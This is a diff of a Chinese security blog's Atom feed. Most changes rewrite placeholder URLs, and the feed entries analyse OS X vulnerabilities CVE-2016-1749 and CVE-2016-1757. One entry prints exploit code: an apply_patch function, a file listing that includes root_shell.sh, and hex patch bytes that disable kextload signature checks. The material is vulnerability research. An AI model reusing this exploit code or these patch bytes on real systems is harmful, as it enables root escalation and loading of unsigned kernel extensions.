@@ -3,9 +3,9 @@
   <title><![CDATA[mrh的学习分享]]></title>
   <subtitle><![CDATA[胸口写一个勇字]]></subtitle>
   <link href="/atom.xml" rel="self"/>
-  <link href="http://yoursite.com/"/>
+  <link href="http://turingh.github.io/"/>
   <updated>2016-05-23T18:56:05.000Z</updated>
-  <id>http://yoursite.com/</id>
+  <id>http://turingh.github.io/</id>
   
   <author>
     <name><![CDATA[mrh]]></name>
@@ -16,19 +16,19 @@
   
   <entry>
     <title><![CDATA[10-11-4版本小结]]></title>
-    <link href="http://yoursite.com/2016/05/23/10-11-4%E7%89%88%E6%9C%AC%E5%B0%8F%E7%BB%93/"/>
-    <id>http://yoursite.com/2016/05/23/10-11-4版本小结/</id>
+    <link href="http://turingh.github.io/2016/05/23/10-11-4%E7%89%88%E6%9C%AC%E5%B0%8F%E7%BB%93/"/>
+    <id>http://turingh.github.io/2016/05/23/10-11-4版本小结/</id>
     <published>2016-05-23T18:21:22.000Z</published>
     <updated>2016-05-23T18:56:05.000Z</updated>
     <content type="html"><![CDATA[<h1 id="0x00_版本小结">0x00 版本小结</h1><p>在<code>10.11.4</code>版本开始着手研究<code>OS X</code>系统安全方面的知识，上周苹果发布了<code>10.11.5</code>版本，<code>10.11.4</code>版本的补丁中还有大量的漏洞没有研究完，又放出了新的版本，这里稍微做一下总结。</p>
 <h1 id="0x01_10-11-4_小结">0x01 10.11.4 小结</h1><h2 id="1-1_基础知识">1.1 基础知识</h2><h3 id="1-1-1_macho格式学习">1.1.1 macho格式学习</h3><p>​    因为刚开始研究<code>OS X</code>系统，花了一部分时间研究了mach-o文件格式的知识，在后续的漏洞分析中发现，mach-o文件的知识还不够扎实，还会有很多似懂非懂的问题。</p>
-<p><a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/" target="_blank" rel="external">mach-o格式分析</a></p>
-<p><a href="http://turingh.github.io/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" target="_blank" rel="external">Mach-O的动态链接相关知识</a></p>
-<p><a href="http://turingh.github.io/2016/03/22/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="external">fishhook源码分析</a></p>
-<p><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" target="_blank" rel="external">OSX内核加载mach-o流程分析</a></p>
-<h3 id="1-1-2_dyld源码分析">1.1.2 dyld源码分析</h3><p><a href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/" target="_blank" rel="external">dyld源码分析-动态加载load</a></p>
-<p><a href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">dyld中mach-o文件加载的简单分析</a></p>
-<h2 id="1-2漏洞分析">1.2漏洞分析</h2><p>​    主要分析了两个漏洞<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">CVE-2016-1757</a>以及<a href="http://turingh.github.io/2016/04/29/CVE-2016-1749%E5%86%85%E6%A0%B8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%E5%88%86%E6%9E%90/" target="_blank" rel="external">CVE-2016-1749</a>。两个漏洞一个是应用层一个是内核层的，在分析研究漏洞的过程中，也熟悉掌握了ida，bindiff，lldb等一系列工具的实际操作。在分析另外一个内核漏洞的过程中，发现在内核框架的掌握上有比较大的缺憾，所以花了大量的时间熟悉了内核开发与一些相关部分的源码，所以有半个月时间左右没有通过日志总结学习的小结，在<code>10.11.5</code>版本的漏洞研究时将补充相关的内容。</p>
+<p><a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">mach-o格式分析</a></p>
+<p><a href="http://turingh.github.io/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/">Mach-O的动态链接相关知识</a></p>
+<p><a href="http://turingh.github.io/2016/03/22/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">fishhook源码分析</a></p>
+<p><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">OSX内核加载mach-o流程分析</a></p>
+<h3 id="1-1-2_dyld源码分析">1.1.2 dyld源码分析</h3><p><a href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/">dyld源码分析-动态加载load</a></p>
+<p><a href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">dyld中mach-o文件加载的简单分析</a></p>
+<h2 id="1-2漏洞分析">1.2漏洞分析</h2><p>​    主要分析了两个漏洞<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>以及<a href="http://turingh.github.io/2016/04/29/CVE-2016-1749%E5%86%85%E6%A0%B8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%E5%88%86%E6%9E%90/">CVE-2016-1749</a>。两个漏洞一个是应用层一个是内核层的，在分析研究漏洞的过程中，也熟悉掌握了ida，bindiff，lldb等一系列工具的实际操作。在分析另外一个内核漏洞的过程中，发现在内核框架的掌握上有比较大的缺憾，所以花了大量的时间熟悉了内核开发与一些相关部分的源码，所以有半个月时间左右没有通过日志总结学习的小结，在<code>10.11.5</code>版本的漏洞研究时将补充相关的内容。</p>
 <ul>
 <li>libkern c++ 运行时源码学习</li>
 <li>kext内核扩展加载流程</li>
@@ -44,16 +44,16 @@
     <![CDATA[<h1 id="0x00_版本小结">0x00 版本小结</h1><p>在<code>10.11.4</code>版本开始着手研究<code>OS X</code>系统安全方面的知识，上周苹果发布了<code>10.11.5</code>版本，<code>10.11.4</cod]]>
     </summary>
     
-      <category term="OS X" scheme="http://yoursite.com/tags/OS-X/"/>
+      <category term="OS X" scheme="http://turingh.github.io/tags/OS-X/"/>
     
-      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
+      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[CVE-2016-1749内核代码执行POC分析]]></title>
-    <link href="http://yoursite.com/2016/04/29/CVE-2016-1749%E5%86%85%E6%A0%B8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%E5%88%86%E6%9E%90/"/>
-    <id>http://yoursite.com/2016/04/29/CVE-2016-1749内核代码执行POC分析/</id>
+    <link href="http://turingh.github.io/2016/04/29/CVE-2016-1749%E5%86%85%E6%A0%B8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%E5%88%86%E6%9E%90/"/>
+    <id>http://turingh.github.io/2016/04/29/CVE-2016-1749内核代码执行POC分析/</id>
     <published>2016-04-29T16:43:50.000Z</published>
     <updated>2016-04-29T20:37:51.000Z</updated>
     <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p><code>OS X</code>系统的10.11.4的系统补丁中修复了一个在内核中可以导致代码执行的漏洞，漏洞形成的原因是缺少了必要的边界值检测。</p>
@@ -111,7 +111,7 @@
 <p>至此POC分析完毕。</p>
 <h1 id="3-4_小结">3.4 小结</h1><p>调试poc花了一些时间，陷入了各种代码实现的分析，和做开发时一样，调bug时需要注重崩溃的现场，分析的过程中经常埋头分析了一大通之后发现得到的信息在崩溃现场已经有了，甚至还有一些分析过程中想不通的问题，在崩溃的现场也已经有线索了。</p>
 <h1 id="reference">reference</h1><p>1.<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=728&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">OS X Kernel code execution due to lack of bounds checking in AppleUSBPipe::Abort</a></p>
-<h1 id="PS">PS</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/" target="_blank" rel="external">http://turingh.github.io/</a></p>
+<h1 id="PS">PS</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
 <p>欢迎大家来探讨，不足之处还请指正。</p>
 ]]></content>
     <summary type="html">
@@ -123,35 +123,35 @@
     
     </summary>
     
-      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
+      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
     
-      <category term="OS X" scheme="http://yoursite.com/tags/OS-X/"/>
+      <category term="OS X" scheme="http://turingh.github.io/tags/OS-X/"/>
     
-      <category term="bounds checking" scheme="http://yoursite.com/tags/bounds-checking/"/>
+      <category term="bounds checking" scheme="http://turingh.github.io/tags/bounds-checking/"/>
     
-      <category term="kernel" scheme="http://yoursite.com/tags/kernel/"/>
+      <category term="kernel" scheme="http://turingh.github.io/tags/kernel/"/>
     
-      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
+      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
     
-      <category term="CVE" scheme="http://yoursite.com/categories/OS-X/CVE/"/>
+      <category term="CVE" scheme="http://turingh.github.io/categories/OS-X/CVE/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[CVE-2016-1757利用程序分析]]></title>
-    <link href="http://yoursite.com/2016/04/19/CVE-2016-1757%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
-    <id>http://yoursite.com/2016/04/19/CVE-2016-1757利用程序分析/</id>
+    <link href="http://turingh.github.io/2016/04/19/CVE-2016-1757%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
+    <id>http://turingh.github.io/2016/04/19/CVE-2016-1757利用程序分析/</id>
     <published>2016-04-19T18:49:14.000Z</published>
     <updated>2016-04-29T20:37:06.000Z</updated>
-    <content type="html"><![CDATA[<h1 id="0X00_摘要">0X00  摘要</h1><p>通过对<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">CVE-2016-1757</a>的<code>POC</code>进行分析，已经完全了解了这个这个漏洞的成因，这里带来其一个<code>Exploit</code>的分析。</p>
+    <content type="html"><![CDATA[<h1 id="0X00_摘要">0X00  摘要</h1><p>通过对<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>的<code>POC</code>进行分析，已经完全了解了这个这个漏洞的成因，这里带来其一个<code>Exploit</code>的分析。</p>
 <p>相关的<code>poc</code>可以到我的<code>github</code>上面获取</p>
 <p><a href="https://github.com/turingH/exploit" target="_blank" rel="external">https://github.com/turingH/exploit</a></p>
 <p>或者直接在<code>google</code>的<code>project zero</code>中下载。</p>
 <p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id" target="_blank" rel="external">https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id</a></p>
 <a id="more"></a>
 <h1 id="0x01_Exploit概览">0x01 Exploit概览</h1><h2 id="1-1_Exploit使用到了哪些技术">1.1 Exploit使用到了哪些技术</h2><ol>
-<li><a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">CVE-2016-1757</a>漏洞的原理。</li>
-<li><a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/" target="_blank" rel="external">利用patch绕过kextload对内核签名的检测</a>。</li>
+<li><a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>漏洞的原理。</li>
+<li><a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/">利用patch绕过kextload对内核签名的检测</a>。</li>
 </ol>
 <h2 id="1-2_Exploit目录结构">1.2 Exploit目录结构</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">➜  executer ls -al</span><br><span class="line">total <span class="number">184</span></span><br><span class="line">drwxr-xr-x@ <span class="number">16</span> turing  staff    <span class="number">544</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">11</span>:<span class="number">30</span> .</span><br><span class="line">drwxr-xr-x@ <span class="number">33</span> turing  staff   <span class="number">1122</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">10</span>:<span class="number">29</span> ..</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff   <span class="number">6148</span>  <span class="number">3</span> <span class="number">30</span> <span class="number">16</span>:<span class="number">45</span> .DS_Store</span><br><span class="line">-rw-r--r--   <span class="number">1</span> turing  staff  <span class="number">16384</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">11</span>:<span class="number">30</span> .executer.c.swp</span><br><span class="line">drwxr-xr-x@  <span class="number">3</span> root    wheel    <span class="number">102</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> FakeKext.kext</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff    <span class="number">397</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> Makefile</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff      <span class="number">0</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> __init__.py</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff   <span class="number">2061</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> build_<span class="built_in">exec</span>_patch.py</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff   <span class="number">1669</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> differ.py</span><br><span class="line">-rw-r--r--   <span class="number">1</span> turing  staff   <span class="number">2085</span>  <span class="number">4</span> <span class="number">12</span> <span class="number">14</span>:<span class="number">53</span> differ.pyc</span><br><span class="line">-rwxr-xr-x   <span class="number">1</span> turing  staff  <span class="number">15308</span>  <span class="number">4</span> <span class="number">13</span> <span class="number">11</span>:<span class="number">00</span> executer</span><br><span class="line">-rw-r--r--   <span class="number">1</span> turing  staff  <span class="number">17534</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">11</span>:<span class="number">02</span> executer.c</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff     <span class="number">37</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> kextload_<span class="built_in">disable</span>_signature_checks.binpatch</span><br><span class="line">-rwxr-xr-x   <span class="number">1</span> turing  staff   <span class="number">1849</span>  <span class="number">4</span> <span class="number">13</span> <span class="number">10</span>:<span class="number">45</span> load_kext.sh</span><br><span class="line">-rwxr-xr-x@  <span class="number">1</span> turing  staff    <span class="number">591</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> root_shell.sh</span><br><span class="line">-rwxr-xr-x@  <span class="number">1</span> turing  staff   <span class="number">1106</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> unload_kext.sh</span><br><span class="line">➜  executer</span><br></pre></td></tr></table></figure>
 <p>主要由5个部分组成</p>
@@ -166,15 +166,15 @@
 <h2 id="2-1_executer与binpatch">2.1 executer与binpatch</h2><p><code>executer</code>是整个<code>exploit</code>中最核心的部分，核心功能有两个。</p>
 <ul>
 <li>通过<code>apply_patch</code>函数获取目标进程需要<code>patch</code>的内容并保存在内存中。</li>
-<li>通过<code>fork</code>子进程在执行目标程序时存在的时间窗口通过<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/#1-3_Ports" target="_blank" rel="external">PORT</a>对目标进程进行内存的改写。</li>
+<li>通过<code>fork</code>子进程在执行目标程序时存在的时间窗口通过<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/#1-3_Ports">PORT</a>对目标进程进行内存的改写。</li>
 </ul>
-<p>通过时间窗口改写目标进程的内存和<code>POC</code>中的实现大同小异，可以参考之前分析<code>POC</code>的<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">文章</a>。</p>
+<p>通过时间窗口改写目标进程的内存和<code>POC</code>中的实现大同小异，可以参考之前分析<code>POC</code>的<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">文章</a>。</p>
 <p>这里简单的分析一个<code>apply_patch</code>函数与</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// at what offset (rounded down to a page boundary) from the start of the mapping in the target should we write?</span></span><br><span class="line"><span class="keyword">size_t</span> target_patch_start_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// how much should we write (rounded up to a page boundary)</span></span><br><span class="line"><span class="keyword">size_t</span> target_patch_write_length = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pointer to the replacement bytes to overwrite with</span></span><br><span class="line"><span class="keyword">char</span>* replacement_bytes = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* apply the patch, recording the lowest and highest addresses we touch */</span></span><br><span class="line"><span class="comment">// original is page-aligned</span></span><br><span class="line"><span class="comment">// 对original文件进行patch</span></span><br><span class="line"><span class="comment">// 这个patch的函数只是为了对kextload进行patch，关闭对未签名内核扩展的验证</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* kextload_disable_signature_checks</span><br><span class="line"> * 0000000000000000  C9 20 00 00 03 00 00 00  31 C0 C3 94 27 00 00 05  . ......1...'...</span><br><span class="line"> * 0000000000000010  00 00 00 90 90 90 31 C0  0D 28 00 00 05 00 00 00  ......1..(......</span><br><span class="line"> * 0000000000000020  90 90 90 31 C0                                    ...1.</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 理论上patch_length = 0x1000,因为length经过roundup的处理。</span></span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">apply_patch</span><span class="params">(<span class="keyword">char</span>* original, size_t original_length, <span class="keyword">char</span>* patch, size_t patch_length)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// patch format is:</span></span><br><span class="line">  <span class="comment">// u32 offset</span></span><br><span class="line">  <span class="comment">// u32 length</span></span><br><span class="line">  <span class="comment">// u8 * length bytes to be written</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//这两个字段用来计算内存中需要保存的数据的开始位置和解释位置</span></span><br><span class="line">  <span class="keyword">char</span>* lowest = (<span class="keyword">char</span>*)UINTPTR_MAX; </span><br><span class="line">  <span class="keyword">char</span>* highest = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> remaining = patch_length;</span><br><span class="line">  <span class="keyword">while</span> (remaining &gt; <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset = *(<span class="keyword">uint32_t</span>*)patch;</span><br><span class="line">    <span class="keyword">uint32_t</span> length = *(<span class="keyword">uint32_t</span>*)(patch+<span class="number">4</span>);</span><br><span class="line">    remaining -= <span class="number">8</span>;</span><br><span class="line">    patch += <span class="number">8</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/*</span><br><span class="line">    	以kextload_disable_signature_checks为例</span><br><span class="line">    	0x000020c9处开始0x00000003个字节改写为0x31 0xc0 0xc3</span><br><span class="line">    	0x00002794处开始0x00000005个字节改写为0x90 0x90 0x90 0x31 0xc0</span><br><span class="line">    	0x0000280D处开始0x00000005个字节改写为0x90 0x90 0x90 0x31 0xc0</span><br><span class="line">    */</span></span><br><span class="line">    </span><br><span class="line">   	<span class="comment">/* 错误处理*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// record if we're extending the boundaries of touched pages</span></span><br><span class="line">    <span class="comment">// 根据patch的地址重新计算两个变量值</span></span><br><span class="line">    <span class="keyword">if</span> ((original+offset) &lt; lowest) &#123;</span><br><span class="line">      lowest = original+offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((original+offset+length) &gt; highest) &#123;</span><br><span class="line">      highest = original+offset+length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// apply the patch</span></span><br><span class="line">    <span class="built_in">memcpy</span>(original+offset, patch, length);</span><br><span class="line">    remaining -= length;</span><br><span class="line">    patch += length;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//需要改写到目标进程的数据的起始</span></span><br><span class="line">  replacement_bytes = ptr_rounddown(lowest);</span><br><span class="line">  <span class="comment">//改写内容在目标进程中的起始位置</span></span><br><span class="line">  target_patch_start_offset = replacement_bytes - original;</span><br><span class="line">  <span class="comment">//需要改写的内容的长度</span></span><br><span class="line">  target_patch_write_length = ptr_roundup(highest) - replacement_bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>结合对<code>port</code>的利用，流程大致如下图所示：</p>
 <p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/patch.png" alt="patch"></p>
 <p>所以<code>executer</code>可以理解为一个抽象的工具，该工具的作用就是通过<code>binpatch</code>文件的内容，对目标程序进行<code>patch</code>并执行。</p>
-<h2 id="2-2_通过Patch绕过加载驱动对签名的要求">2.2 通过Patch绕过加载驱动对签名的要求</h2><p>整个bindiff的比较，以及源码位置可以参照之前的这篇文章。<a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/" target="_blank" rel="external">利用patch绕过kextload对内核签名的检测</a>。</p>
+<h2 id="2-2_通过Patch绕过加载驱动对签名的要求">2.2 通过Patch绕过加载驱动对签名的要求</h2><p>整个bindiff的比较，以及源码位置可以参照之前的这篇文章。<a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/">利用patch绕过kextload对内核签名的检测</a>。</p>
 <p>这里说一下几个被<code>patch</code>掉的函数的关系。</p>
 <table>
 <thead>
@@ -219,7 +219,7 @@
 </ul>
 <h1 id="引用">引用</h1><p>1.<a href="http://googleprojectzero.blogspot.com/2016/03/race-you-to-kernel.html" target="_blank" rel="external">Race you to the kernel!</a></p>
 <p>2.<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;redir=1" target="_blank" rel="external">Logic error when exec-ing suid binaries allows code execution as root on OS X/iOS</a></p>
-<h1 id="PS">PS</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/" target="_blank" rel="external">http://turingh.github.io/</a></p>
+<h1 id="PS">PS</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
 <p>欢迎大家来探讨，不足之处还请指正。</p>
 ]]></content>
     <summary type="html">
@@ -231,24 +231,24 @@
     
     </summary>
     
-      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
+      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
     
-      <category term="execv" scheme="http://yoursite.com/tags/execv/"/>
+      <category term="execv" scheme="http://turingh.github.io/tags/execv/"/>
     
-      <category term="ports" scheme="http://yoursite.com/tags/ports/"/>
+      <category term="ports" scheme="http://turingh.github.io/tags/ports/"/>
     
-      <category term="race" scheme="http://yoursite.com/tags/race/"/>
+      <category term="race" scheme="http://turingh.github.io/tags/race/"/>
     
-      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
+      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
     
-      <category term="CVE" scheme="http://yoursite.com/categories/OS-X/CVE/"/>
+      <category term="CVE" scheme="http://turingh.github.io/categories/OS-X/CVE/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[apple沙盒研究之基础知识]]></title>
-    <link href="http://yoursite.com/2016/04/18/apple%E6%B2%99%E7%9B%92%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
-    <id>http://yoursite.com/2016/04/18/apple沙盒研究之基础知识/</id>
+    <link href="http://turingh.github.io/2016/04/18/apple%E6%B2%99%E7%9B%92%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
+    <id>http://turingh.github.io/2016/04/18/apple沙盒研究之基础知识/</id>
     <published>2016-04-18T15:12:47.000Z</published>
     <updated>2016-04-19T18:52:38.000Z</updated>
     <content type="html"><![CDATA[<h1 id="1_基础知识">1 基础知识</h1><h1 id="1-1_什么是沙盒？">1.1 什么是沙盒？</h1><blockquote>
@@ -304,19 +304,19 @@
     
     </summary>
     
-      <category term="sandbox" scheme="http://yoursite.com/tags/sandbox/"/>
+      <category term="sandbox" scheme="http://turingh.github.io/tags/sandbox/"/>
     
-      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
+      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[利用patch绕过kextload对内核签名的检测]]></title>
-    <link href="http://yoursite.com/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/"/>
-    <id>http://yoursite.com/2016/04/13/利用patch绕过kextload对内核签名的检测/</id>
+    <link href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/"/>
+    <id>http://turingh.github.io/2016/04/13/利用patch绕过kextload对内核签名的检测/</id>
     <published>2016-04-13T17:21:22.000Z</published>
     <updated>2016-04-19T18:44:37.000Z</updated>
-    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    分析<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">CVE-2016-1757</a>的EXP过程中，发现EXP通过对kextload程序的patch，绕过了<code>OSX</code>对驱动扩展数字签名的检测，成功加载未签名的驱动扩展。</p>
